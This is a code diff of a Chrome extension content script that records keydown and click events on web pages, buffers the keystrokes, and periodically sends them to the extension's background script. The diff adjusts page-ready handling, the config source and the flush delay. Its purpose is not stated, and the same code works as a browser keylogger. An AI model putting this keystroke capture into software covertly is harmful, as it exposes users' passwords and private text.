@@ -6,19 +6,33 @@ var listener;
 
 
 // JQUERY -- $(document).ready(() =>{})
+// function ready(fn) {
+//     if (document.readyState != 'loading'){
+//         fn();
+//     } else {
+//         document.removeEventListener('DOMContentLoaded', fn);
+//         document.addEventListener('DOMContentLoaded', fn);
+//     }
+// }
 function ready(fn) {
-    if (document.readyState != 'loading'){
+    if(document.readyState != 'loading') {
+        console.log("Page load complete");
         fn();
     } else {
-        document.removeEventListener('DOMContentLoaded', fn);
-        document.addEventListener('DOMContentLoaded', fn);
+        document.addEventListener('readystatechange', event => {
+            if(event.target.readyState != 'loading') {
+                console.log("Page load after listening");
+                fn();
+            }
+        })
     }
 }
 
 ready(() => {
     try {
-        chrome.runtime.sendMessage({source: 'config'}, (res) => { //Wait for config response
-            let config = res ? JSON.parse(res.config): {};
+        // chrome.runtime.sendMessage({source: 'config'}, (res) => { //Wait for config response
+        chrome.storage.sync.get(['config'], function(result) {
+            let config = result ? result.config: {};
             globalBuffer = [];
             const options = {
                 eventType: 'keydown',
@@ -28,7 +42,7 @@ ready(() => {
             document.addEventListener('click', handleMouseClick);
             keyMapper(options);
             const delay = hasProperty('keystrokeDelay', options) && options.keystrokeDelay >= 300 && options.keystrokeDelay;
-            const keystrokeDelay = delay || 1000;
+            const keystrokeDelay = delay || 5000;
             // Logic: Every second check if the last key time (global) was longer than the delay time ago. If it was than send what is in the buffer and reset it
             window.setInterval(() => {
                 if(globalBuffer && globalBuffer.length != 0 && (Date.now() - globalLastKeyTime > keystrokeDelay)) {
@@ -38,7 +52,7 @@ ready(() => {
             }, 1000); // 1 seconds
         });
 
-    }catch(e) {
+    } catch(e) {
         console.warn("Cannot remove event listener", e);
     }
 });
@@ -88,7 +102,7 @@ function handleKeyboardInput(event) {
 function sendBufferData() {
     if(globalBuffer && globalBuffer.length != 0) {
         console.log("Sending buffer to main", globalBuffer);
-        chrome.runtime.sendMessage({source: 'keyboard', data: globalBuffer})
+        chrome.runtime.sendMessage({source: 'keyboard', data: globalBuffer});
         globalBuffer = [];
     }
 }
